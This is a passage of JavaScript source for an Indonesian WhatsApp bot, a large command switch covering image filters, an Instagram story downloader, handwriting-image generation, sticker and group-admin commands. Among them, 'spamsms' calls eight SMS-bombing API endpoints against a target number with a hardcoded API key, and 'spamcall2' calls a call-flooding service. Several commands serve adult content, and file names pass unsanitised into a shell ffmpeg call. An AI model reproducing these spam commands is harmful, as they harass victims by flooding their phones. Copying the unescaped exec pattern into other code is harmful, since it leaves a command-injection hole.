             reply('Suksess broadcast')
}
             break


  case 'spamsms':{



if (!isPremium) return reply(`khusus premium`)



  if (args.length > 1) return reply(`Cara penggunaan : ${command} no hp`)











 try {



await fetchJson(`https://api.lolhuman.xyz/api/sms/spam1?apikey=IkyChan&nomor=${args[1]}`)



await fetchJson(`https://api.lolhuman.xyz/api/sms/spam2?apikey=IkyChan&nomor=${args[1]}`)



await fetchJson(`https://api.lolhuman.xyz/api/sms/spam3?apikey=IkyChan&nomor=${args[1]}`)



await fetchJson(`https://api.lolhuman.xyz/api/sms/spam4?apikey=IkyChan&nomor=${args[1]}`)



await fetchJson(`https://api.lolhuman.xyz/api/sms/spam5?apikey=IkyChan&nomor=${args[1]}`)



await fetchJson(`https://api.lolhuman.xyz/api/sms/spam6?apikey=IkyChan&nomor=${args[1]}`)



await fetchJson(`https://api.lolhuman.xyz/api/sms/spam7?apikey=IkyChan&nomor=${args[1]}`)



await fetchJson(`https://api.lolhuman.xyz/api/sms/spam8?apikey=IkyChan&nomor=${args[1]}`)



reply("Success")



 } catch (err) {



sendMess(ownerNumber, `${command} Error:` + err)



reply(mess.error.api)



 }



  }



  break







  case '!':



  case '#':



  case 'z':



  case '.':



  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: freply})



break



 ////NEW UPDATE COPAS DARI XINZ



 case 'threats':







 if (isImage || isQuotedImage) {



let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg



let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



var link = await uptotele(yoooo)



getBuffer(`https://nekobot.xyz/api/imagegen?type=threats&url=${link}&raw=1`)



.then(async(res) =>{



  wann.sendImage(from, res, 'ini', msg)



  limitAdd(sender, limit)



}) 



 } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {



let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo



let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



let ran = getRandom('.png')



exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {



  fs.unlinkSync(yoooo)



  if (err) return reply('Gagal :V')



 var link = await uptotele(ran)



  getBuffer(`https://nekobot.xyz/api/imagegen?type=threats&url=${link}&raw=1`)



  .then(async(res) =>{



 wann.sendImage(from, res, 'ini', msg)



 limitAdd(sender, limit)



 fs.unlinkSync(ran)



  })



})



 } else {



  reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)



}



break



case 'buriq': case 'burik':







if (isImage || isQuotedImage) {



 let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg



 let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



 var link = await uptotele(yoooo)



 getBuffer(`https://nekobot.xyz/api/imagegen?type=jpeg&url=${link}&raw=1`)



 .then(async(res) =>{



wann.sendImage(from, res, 'ini', msg)



limitAdd(sender, limit)



 }) 



  } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {



 let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo



 let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



 let ran = getRandom('.png')



 exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {



fs.unlinkSync(yoooo)



if (err) return reply('Gagal :V')



  var link = await uptotele(ran)



getBuffer(`https://nekobot.xyz/api/imagegen?type=jpeg&url=${link}&raw=1`)



.then(async(res) =>{



  wann.sendImage(from, res, 'ini', msg)



  limitAdd(sender, limit)



  fs.unlinkSync(ran)



})



 })



  } else {



reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)



 }



 break



 case 'getstory':







 if (!args.length) return reply(from, "Urutan keberapa? #getstory urutan", lin)



  quotedText = wan.message.extendedTextMessage.contextInfo.quotedMessage.conversation



var pilur = quotedText.split('👱🏻‍♂️ *Username :* ')



var a = await axios.get(`https://megayaa.herokuapp.com/api/igstori?username=${pilur[1].split("\n")[0]}`)







if (!q.match(/^[0-9]/)) return reply(from, "Pastikan urutan hanya angka", wan)



  var typemsgg = image



if (a.data.data[q - 1].type === "mp4") typemsgg = video



  await wann.sendMessage(from, {url: `${a.data.data[q - 1].url}`}, typemsgg)







break



case 'igstory':



var a = await axios.get(`https://megayaa.herokuapp.com/api/igstori?username=${args.join(" ")}`)



var teks = `*Instagram story downloader*\n\n👱🏻‍♂️ *Username :* ${a.data.username}\n🖼️ *Count :* ${a.data.stories_count}\n\nreply pesan dan ketik *${prefix}getstory urutan* untuk mengambil media\n\n`



var urut = 1



for (let i = 0; i < a.data.data.length; i++) {



  var ab = await axios.get(`https://megayaa.herokuapp.com/api/short/tiny?url=${a.data.data[i].url}`)



  teks += `*Urutan : ${urut++}*\n💻 *Type :* ${a.data.data[i].type === "mp4" ? "video 🎥" : "foto 📸"}\n📑 *Url :* ${ab.data.result}\n\n`



}



wann.sendMessage(from, teks, text,{ quoted: wan})











break



case 'deep': case 'deepfry':







if (isImage || isQuotedImage) {



  let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg



  let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



  var link = await uptotele(yoooo)



  getBuffer(`https://nekobot.xyz/api/imagegen?type=deepfry&image=${link}&raw=1`)



  .then(async(res) =>{



 wann.sendImage(from, res, 'ini', msg)



 limitAdd(sender, limit)



  }) 



} else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {



  let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo



  let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



  let ran = getRandom('.png')



  exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {



 fs.unlinkSync(yoooo)



 if (err) return reply('Gagal :V')



var link = await uptotele(ran)



 getBuffer(`https://nekobot.xyz/api/imagegen?type=deepfry&image=${link}&raw=1`)



 .then(async(res) =>{



wann.sendImage(from, res, 'ini', msg)



limitAdd(sender, limit)



fs.unlinkSync(ran)



 })



  })



} else {



 reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)



  }



  break



  case 'magik': case 'magic':







  if (isImage || isQuotedImage) {



let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg



let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



var link = await uptotele(yoooo)



getBuffer(`https://nekobot.xyz/api/imagegen?type=magik&image=${link}&raw=1`)



.then(async(res) =>{



  wann.sendImage(from, res, 'ini', msg)



  limitAdd(sender, limit)



}) 



 } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {



let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo



let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



let ran = getRandom('.png')



exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {



  fs.unlinkSync(yoooo)



  if (err) return reply('Gagal :V')



 var link = await uptotele(ran)



  getBuffer(`https://nekobot.xyz/api/imagegen?type=magik&image=${link}&raw=1`)



  .then(async(res) =>{



 wann.sendImage(from, res, 'ini', msg)



 limitAdd(sender, limit)



 fs.unlinkSync(ran)



  })



})



 } else {



  reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)



}



break



case 'blurpify':







if (isImage || isQuotedImage) {



 let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg



 let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



 var link = await uptotele(yoooo)



 getBuffer(`https://nekobot.xyz/api/imagegen?type=blurpify&image=${link}&raw=1`)



 .then(async(res) =>{



wann.sendImage(from, res, 'ini', msg)



limitAdd(sender, limit)



 }) 



  } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {



 let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo



 let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



 let ran = getRandom('.png')



 exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {



fs.unlinkSync(yoooo)



if (err) return reply('Gagal :V')



  var link = await uptotele(ran)



getBuffer(`https://nekobot.xyz/api/imagegen?type=blurpify&image=${link}&raw=1`)



.then(async(res) =>{



  wann.sendImage(from, res, 'ini', msg)



  limitAdd(sender, limit)



  fs.unlinkSync(ran)



})



 })



  } else {



reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)



 }



 break



 case 'captcha':







 if (!q) return reply(`Penggunaan ${command} query lalu reply gambar/sticker`)



  if (isImage || isQuotedImage) {



 let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg



 let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



 var link = await uptotele(yoooo)



 getBuffer(`https://nekobot.xyz/api/imagegen?type=captcha&url=${link}&raw=1&username=${q}`)



 .then(async(res) =>{



wann.sendImage(from, res, 'ini', msg)



limitAdd(sender, limit)



 }) 



  } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {



 let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo



 let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



 let ran = getRandom('.png')



 exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {



fs.unlinkSync(yoooo)



if (err) return reply('Gagal :V')



  var link = await uptotele(ran)



getBuffer(`https://nekobot.xyz/api/imagegen?type=captcha&url=${link}&raw=1&username=${q}`)



.then(async(res) =>{



  wann.sendImage(from, res, 'ini', msg)



  limitAdd(sender, limit)



  fs.unlinkSync(ran)



})



 })



  } else {



reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)



 }



 break



 case 'glass':







 if (isImage || isQuotedImage) {



  let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg



  let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



  var link = await uptotele(yoooo)



  getBuffer(`https://some-random-api.ml/canvas/glass?avatar=${link}`)



  .then(async(res) =>{



 wann.sendImage(from, res, 'ini', msg)



 limitAdd(sender, limit)



  }) 



} else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {



  let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo



  let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



  let ran = getRandom('.png')



  exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {



 fs.unlinkSync(yoooo)



 if (err) return reply('Gagal :V')



var link = await uptotele(ran)



 getBuffer(`https://some-random-api.ml/canvas/glass?avatar=${link}`)



 .then(async(res) =>{



wann.sendImage(from, res, 'ini', msg)



limitAdd(sender, limit)



fs.unlinkSync(ran)



 })



  })



} else {



 reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)



  }



  break



  case 'greyscale':







  if (isImage || isQuotedImage) {



let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg



let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



var link = await uptotele(yoooo)



getBuffer(`https://some-random-api.ml/canvas/greyscale?avatar=${link}`)



.then(async(res) =>{



  wann.sendImage(from, res, 'ini', msg)



  limitAdd(sender, limit)



}) 



 } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {



let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo



let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



let ran = getRandom('.png')



exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {



  fs.unlinkSync(yoooo)



  if (err) return reply('Gagal :V')



 var link = await uptotele(ran)



  getBuffer(`https://some-random-api.ml/canvas/greyscale?avatar=${link}`)



  .then(async(res) =>{



 wann.sendImage(from, res, 'ini', msg)



 limitAdd(sender, limit)



 fs.unlinkSync(ran)



  })



})



 } else {



  reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)



}



break



case 'invert':







if (isImage || isQuotedImage) {



 let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg



 let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



 var link = await uptotele(yoooo)



 getBuffer(`https://some-random-api.ml/canvas/invert?avatar=${link}`)



 .then(async(res) =>{



wann.sendImage(from, res, 'ini', msg)



limitAdd(sender, limit)



 }) 



  } else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {



 let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo



 let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



 let ran = getRandom('.png')



 exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {



fs.unlinkSync(yoooo)



if (err) return reply('Gagal :V')



  var link = await uptotele(ran)



getBuffer(`https://some-random-api.ml/canvas/invert?avatar=${link}`)



.then(async(res) =>{



  wann.sendImage(from, res, 'ini', msg)



  limitAdd(sender, limit)



  fs.unlinkSync(ran)



})



 })



  } else {



reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)



 }



 break



 case 'tagme':



 mentions(`@${sender.split("@")[0]}`, [sender], true)



 break



 case 'invertgrey':







 if (isImage || isQuotedImage) {



  let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : msg



  let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



  var link = await uptotele(yoooo)



  getBuffer(`https://some-random-api.ml/canvas/invertgreyscale?avatar=${link}`)



  .then(async(res) =>{



 wann.sendImage(from, res, 'ini', msg)



 limitAdd(sender, limit)



  }) 



} else if (isQuotedSticker && !quotedMsg.stickerMessage.isAnimated === true) {



  let encmedia = JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo



  let yoooo = await wann.downloadAndSaveMediaMessage(encmedia)



  let ran = getRandom('.png')



  exec(`ffmpeg -i ${yoooo} ${ran}`, async (err) => {



 fs.unlinkSync(yoooo)



 if (err) return reply('Gagal :V')



var link = await uptotele(ran)



 getBuffer(`https://some-random-api.ml/canvas/invertgreyscale?avatar=${link}`)



 .then(async(res) =>{



wann.sendImage(from, res, 'ini', msg)



limitAdd(sender, limit)



fs.unlinkSync(ran)



 })



  })



} else {



 reply(`Kirim/reply gambar atau sticker dengan caption ${command}`)



  }



  break



  case 'nulishelp':



  reply(`*Pilihan*\n${prefix}nuliskiri\n${prefix}nuliskanan\n${prefix}foliokiri\n${prefix}foliokanan`)



  break



  case 'nuliskiri':{







if (args.length < 2) return reply(`Kirim perintah *${prefix}nuliskiri* teks`)



  reply(mess.wait)



const tulisan = body.slice(11)



const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')



const fixHeight = splitText.split('\n').slice(0, 31).join('\n')



spawn('convert', [



  './media/nulis/images/buku/sebelumkiri.jpg',



  '-font',



  './media/nulis/font/Indie-Flower.ttf',



  '-size',



  '960x1280',



  '-pointsize',



  '22',



  '-interline-spacing',



  '2',



  '-annotate',



  '+140+153',



  fixHeight,



  './media/nulis/images/buku/setelahkiri.jpg'



  ])



.on('error', () => reply(mess.error.api))



.on('exit', () => {



  wann.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkiri.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})







})



 }



 break



 case 'nuliskanan':{







if (args.length < 2) return reply(`Kirim perintah *${prefix}nuliskanan* teks`)



  reply(mess.wait)



const tulisan = body.slice(12)



const splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')



const fixHeight = splitText.split('\n').slice(0, 31).join('\n')



spawn('convert', [



  './media/nulis/images/buku/sebelumkanan.jpg',



  '-font',



  './media/nulis/font/Indie-Flower.ttf',



  '-size',



  '960x1280',



  '-pointsize',



  '23',



  '-interline-spacing',



  '2',



  '-annotate',



  '+128+129',



  fixHeight,



  './media/nulis/images/buku/setelahkanan.jpg'



  ])



.on('error', () => reply(mess.error.api))



.on('exit', () => {



  wann.sendMessage(from, fs.readFileSync('./media/nulis/images/buku/setelahkanan.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})







})



 }



 break



 case 'foliokiri':{







if (args.length < 2) return reply(`Kirim perintah *${prefix}foliokiri* teks`)



  reply(mess.wait)



const tulisan = body.slice(11)



const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')



const fixHeight = splitText.split('\n').slice(0, 38).join('\n')



spawn('convert', [



  './media/nulis/images/folio/sebelumkiri.jpg',



  '-font',



  './media/nulis/font/Indie-Flower.ttf',



  '-size',



  '1720x1280',



  '-pointsize',



  '23',



  '-interline-spacing',



  '4',



  '-annotate',



  '+48+185',



  fixHeight,



  './media/nulis/images/folio/setelahkiri.jpg'



  ])



.on('error', () => reply(mess.error.api))



.on('exit', () => {



  wann.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkiri.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})







})



 }



 break



 case 'foliokanan':{







if (args.length < 2) return reply(`Kirim perintah *${prefix}foliokanan* teks`)



  reply(mess.wait)



const tulisan = body.slice(12)



const splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')



const fixHeight = splitText.split('\n').slice(0, 38).join('\n')



spawn('convert', [



  './media/nulis/images/folio/sebelumkanan.jpg',



  '-font',



  './media/nulis/font/Indie-Flower.ttf',



  '-size',



  '960x1280',



  '-pointsize',



  '23',



  '-interline-spacing',



  '3',



  '-annotate',



  '+89+190',



  fixHeight,



  './media/nulis/images/folio/setelahkanan.jpg'



  ])



.on('error', () => reply(mess.error.api))



.on('exit', () => {



  wann.sendMessage(from, fs.readFileSync('./media/nulis/images/folio/setelahkanan.jpg'), image, {quoted: msg, caption: `Jangan malas pak...`})







})



 }



 break



 case 'slap':







 if (mentioned.length !== 0){



fetchJson ('https://www.nekos.life/api/v2/img/slap').then(({url}) => {



  wann.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {



 await sleep(2000);mentions(`@${mentioned[0].split('@')[0]} slapped @${sender.split('@')[0]}`, [sender, mentioned[0]], true)})



})



 } else {



reply(`Penggunaan ${command} @tag`)



 }



 break



 case 'pat':







 if (mentioned.length !== 0){



fetchJson ('https://www.nekos.life/api/v2/img/pat').then(({url}) => {



  wann.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {



 await sleep(2000);mentions(`@${sender.split('@')[0]} pat @${mentioned[0].split('@')[0]}`, [sender, mentioned[0]], true)})



})



 } else {



reply(`Penggunaan ${command} @tag`)



 }



 break



 case 'baka':







 if (mentioned.length !== 0){



fetchJson ('https://www.nekos.life/api/v2/img/baka').then(({url}) => {



  wann.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {



 await sleep(2000);mentions(`@${mentioned[0].split('@')[0]} Baka!!`, [sender, mentioned[0]], true)})



})



 } else {



reply(`Penggunaan ${command} @tag`)



 }



 break







 case 'semoji2': {







if (args.length < 2) return reply(`Penggunaan ${command} emoji`)



  if (args.length === 2) {



 fetchJson(`https://api.lolhuman.xyz/api/smoji3/${encodeURIComponent(args[1])}?apikey=${lolkey}`)



 .then((res) =>{



let list = []



let startnum = 1



for (var x in res.result.emoji) {



  let yy = {title: 'Model ke-' + startnum++,



  rows: [



  {



 title: `${x}`,



 description: `${x} model`,



 rowId: `${prefix}esticker ${args[1]} ${res.result.emoji[x]}`



  }



  ]



}



list.push(yy)



 }



 wann.sendList(from, `List Sticker`, `Kan model stickernya banyak tu kak, kaka mau model sticker yg mana ya? Pilih dibawah ya kak`, args[1], `Pilih Disini`, list, msg)



  })



 .catch((err) => {



wann.sendMess(ownerNumber[0], `${command} Error:` + err)



reply(mess.error.api)



 })



  } else if (args.length === 3) {



 wann.sendSticker(from, args[2], msg)







  }



}



break



case 'ceritasex': case 'cersex':











fetchJson('http://docs-jojo.herokuapp.com/api/cersex')



.then((res) => wann.sendFileFromUrl(from, res.result.img, res.result.judul + `\n\n` + res.result.cersex))



.catch((err) => {



  wann.sendMess(ownerNumber[0], `${command} Error:` + err)



  reply(mess.error.api)



})



break



case 'aspan': case 'ptl': case 'ptlvid':{



  if (!isPremium) return reply(mess.OnlyPrem)



 fetchText('http://sansekai.my.id/sansekai.txt').then((data) => {



var wifegerak = data.split('\n')



var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]



wann.sendFileFromUrl(from, `http://sansekai.my.id/ptl_repost/${wifegerakx}`, 'Follow IG: https://www.instagram.com/ptl_repost untuk mendapatkan asupan lebih banyak.', msg)



 })



}



break



case 'spamcall2':{



  if (!isPremium) return reply(mess.OnlyPrem)



 if (args.length > 2) return reply(`Cara penggunaan : ${command} no hp`)



if (isNaN(args[1]) && args[1].startsWith('62')) return reply(`Harus berupa angka dan pastikan tidak memasukkan kode negara, contoh: ${command} 8127668234`)



  fetchJson(`https://api.justaqul.xyz/call?nomor=${args[1]}&apikey=${aqulzkey}`)



.then((data) => {



  textImg(data.result)



})



.catch((err) => {



  wann.sendMess(ownerNumber[0], `${command} Error:` + err)



  reply(mess.error.api)



})



 }



 break



 case 'hug':







 if (mentioned.length !== 0){



fetchJson ('https://www.nekos.life/api/v2/img/hug').then(({url}) => {



  wann.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {



 await sleep(2000);mentions(`@${mentioned[0].split('@')[0]} hugged @${sender.split('@')[0]}`, [sender, mentioned[0]], true)})



})



 } else {



reply(`Penggunaan ${command} @tag`)



 }



 break



 case 'cium':







 if (mentioned.length !== 0){



fetchJson ('https://www.nekos.life/api/v2/img/kiss').then(({url}) => {



  wann.sendSticker(from, url, msg, true, [], {contextInfo: {"mentionedJid": [sender, mentioned[0]]}}).then(async (res) => {



 await sleep(2000);mentions(`@${mentioned[0].split('@')[0]} kissed @${sender.split('@')[0]}`, [sender, mentioned[0]], true)})



})



 } else {



reply(`Penggunaan ${command} @tag`)



 }



 break



 case 'bokep': case 'bkp': case 'randombokep':{



if (!isPremium) return reply(mess.OnlyPrem)







  fetchJson(`https://pastebin.com/raw/k82VJzeP`).then((data) => {



 var bokepp = JSON.parse(JSON.stringify(data))



 var bokep2 =  bokepp[Math.floor(Math.random() * bokepp.length)]



 textImg(bokep2.teks)



  })



 }



 break



////Anti delete



case 'antidelete':



if (!isOwner && !isGroupAdmins) return reply(mess.GrupAdmin)



  const dataRevoke = JSON.parse(fs.readFileSync('./database/gc-revoked.json'))



const dataCtRevoke = JSON.parse(fs.readFileSync('./database/ct-revoked.json'))



const dataBanCtRevoke = JSON.parse(fs.readFileSync('./database/ct-revoked-banlist.json'))



const isRevoke = dataRevoke.includes(from)



const isCtRevoke = dataCtRevoke.data



const isBanCtRevoke = dataBanCtRevoke.includes(sender) ? true : false



if (args.length === 1) return reply(`Penggunaan fitur antidelete :\n\n*${prefix}antidelete [aktif/mati]* (Untuk grup)\n*${prefix}antidelete [ctaktif/ctmati]* (untuk semua kontak)\n*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`)



  if (args[1] == 'aktif') {



if (isGroup) {



 if (isRevoke) return reply(`Antidelete telah diaktifkan di grup ini sebelumnya!`)



dataRevoke.push(from)



 fs.writeFileSync('./database/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))



 reply(`Antidelete diaktifkan di grup ini!`)



  } else if (!isGroup) {



 reply(`Untuk kontak penggunaan *${prefix}antidelete ctaktif*`)



  }



} else if (args[1] == 'ctaktif') {



  if (!isOwner && !fromMe) return reply(mess.OnlyOwner)



if (!isGroup) {



 if (isCtRevoke) return reply(`Antidelete telah diaktifkan di semua kontak sebelumnya!`)



dataCtRevoke.data = true



 fs.writeFileSync('./database/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))



 reply(`Antidelete diaktifkan disemua kontak!`)



  } else if (isGroup) {



 reply(`Untuk grup penggunaan *${prefix}antidelete aktif*`)



  }



} else if (args[1] == 'banct') {



  if (!isOwner && !fromMe) return reply(mess.OnlyOwner)



if (isBanCtRevoke) return reply(`kontak ini telah ada di database banlist!`)



  if (args.length === 2 || args[2].startsWith('0')) return reply(`Masukan nomer diawali dengan 62! contoh 62859289xxxxx`)



 dataBanCtRevoke.push(args[2] + '@s.whatsapp.net')



  fs.writeFileSync('./database/ct-revoked-banlist.json', JSON.stringify(dataBanCtRevoke, null, 2))



  reply(`Kontak ${args[2]} telah dimasukan ke banlist antidelete secara permanen!`)



} else if (args[1] == 'mati') {



  if (isGroup) {



const index = dataRevoke.indexOf(from)



dataRevoke.splice(index, 1)



fs.writeFileSync('./database/gc-revoked.json', JSON.stringify(dataRevoke, null, 2))



reply(`Antidelete dimatikan di grup ini!`)



 } else if (!isGroup) {



reply(`Untuk kontak penggunaan *${prefix}antidelete ctmati*`)



 }



  } else if (args[1] == 'ctmati') {



 if (!isOwner && !fromMe) return reply(mess.OnlyOwner)



  if (!isGroup) {



dataCtRevoke.data = false



fs.writeFileSync('./database/ct-revoked.json', JSON.stringify(dataCtRevoke, null, 2))



reply(`Antidelete dimatikan disemua kontak!`)



 } else if (isGroup) {



reply(`Untuk grup penggunaan *${prefix}antidelete mati*`)



 }



  } else {



 reply(`Penggunaan fitur antidelete :\n\n*${prefix}antidelete [aktif/mati]* (Untuk grup)\n*${prefix}antidelete [ctaktif/ctmati]* (untuk semua kontak)\n*${prefix}antidelete banct 628558xxxxxxx* (banlist kontak)`)



  }



  break



				//



				case 'setname':



  if (!isOwner) return reply(mess.OnlyOwner)



 if (args.length < 2) return reply(`Masukkan text`)



  await wann.updateProfileName(q)



reply(`Success`)



break



case 'revoke':



case 'revokegroup':



case 'revokelink': {



 if (!isGroup) return reply(mess.OnlyGrup)



if (!isGroupAdmins)return reply(mess.GrupAdmin)



  if (!isBotGroupAdmins) return reply(mess.BotAdmin)



 var linkgc = await wann.revokeInvite(from)



  mentions(`Link Group Berhasil direset oleh admin @${sender.split('@')[0]}`, [sender], true)



}



break



					//------------------< Enable / Disable >-------------------



 


  case 'clearbadword':



  if (!isOwner) return reply(mess.OnlyOwner)



 if (args.length < 2) return reply(`tag atau nomor`)



if (mentioned.length !== 0){



  for (let i = 0; i < mentioned.length; i++){



 delCountKasar(mentioned[i], senbadword)



  }



  reply('Sukses')



} else {



  delCountKasar(args[1] + '@s.whatsapp.net', senbadword)



  reply('Sukses')



}



break



case 'antiviewonce':



case 'antivo':



if (!q) return reply(`Pilih enable atau disable`)



  if (q.toLowerCase() === 'enable') {



 if (isAntiviewonce) return reply(`Udah aktif`)



antivo.push(from)



 fs.writeFileSync('./database/antiviewonce.json', JSON.stringify(antivo))



 reply('Antiview Once grup aktif')



  } else if (q.toLowerCase() === 'disable') {



 let anu = antivo.indexOf(from)



 antivo.splice(anu, 1)



 fs.writeFileSync('./database/antiviewonce.json', JSON.stringify(antivo))



 reply('antiviewonce grup nonaktif')



  } else {



 testqq(from, `antiviewonce`)



  }



  break



  case 'antidelete':



  case 'antidel':



  if (!q) return reply(`Pilih enable atau disable`)



 if (q.toLowerCase() === 'enable') {



if (isAntidel) return reply(`Udah aktif`)



  antidel.push(from)



fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidel))



reply('anti delete grup aktif')



 } else if (q.toLowerCase() === 'disable') {



let anu = antidel.indexOf(from)



antidel.splice(anu, 1)



fs.writeFileSync('./database/antidelete.json', JSON.stringify(antidel))



reply('antiviewonce grup nonaktif')



 } else {



testqq(from, `antiviewonce`)



 }



 break



 case 'exampleid':



 case 'contoh':



 case 'carapakai':



 tutor = `*TERDETEKSI INDONESIA*







Ini adalah bot WhatsApp yg bisa membantu anda !



contoh command simpel







# *!sticker* yaitu untuk membuat sticker di WhatsApp *kirim/reply foto* dengan caption *!sticker*



 



# *!ytdl* yaitu untuk mengunduh video/audio dari YouTube *kirim perintah !ytdl di teruskan judul/link YouTube*



 



# *!tahta* yaitu untuk membuat logo *kirim perintah !tahta di lanjut nama request terserah kalian*



 



# *!anime* yaitu untuk stalk anime *kirim perintah !anime lanjut judul anime*



 



# *!pinterest* yaitu untuk membantu mencari gambar *kirim perintah !pinterest lanjut dengan gambar yg kalian cari*



 



# *!nulis* yaitu untuk membantu anda menulis sesuatu dalam bentuk foto *kirim perintah !nulis di lanjut dengan teks yg akan di tulis*



 



# *!alquran* yaitu untuk melihat isi surat yg kalian cari beserta artinya *kirim perintah !alquran di lanjut dengan ayat dan surah yg kalian cari*



 



*Silahkan kalian coba fitur-fitur lain yg sudah di sediakan bot*



 



*Warning*



-dilarang menelpon/vc bot



-dilarang spam bot/jeda 5 detik



-dilarang masukan bot sembarang grup (izin owner,)



-dilarang menggunakan fitur dewasa untuk anak di bawah 18th



-gunakan bot dengan bijak



 



*jadilah pengguna yang baik dan mematuhi rules*



*menu lainnya bisa kalian liat sendiri dengan ketik !command* `







 reply(tutor)







 break







 case 'exampleen':



 case 'methoden':



 tutor1 = 



 `*ENGLISH DETECTED*







This is a WhatsApp bot that can help you!



simple command example 







# *!sticker* is to make a sticker on WhatsApp *send/reply a photo* with the caption *!sticker* 







# *!ytdl* that is to download video/audio from YouTube *send command !ytdl in forward YouTube title/link* 







# *!tahta* that is to make a logo *send orders! throne in advance the name of the request is up to you* 







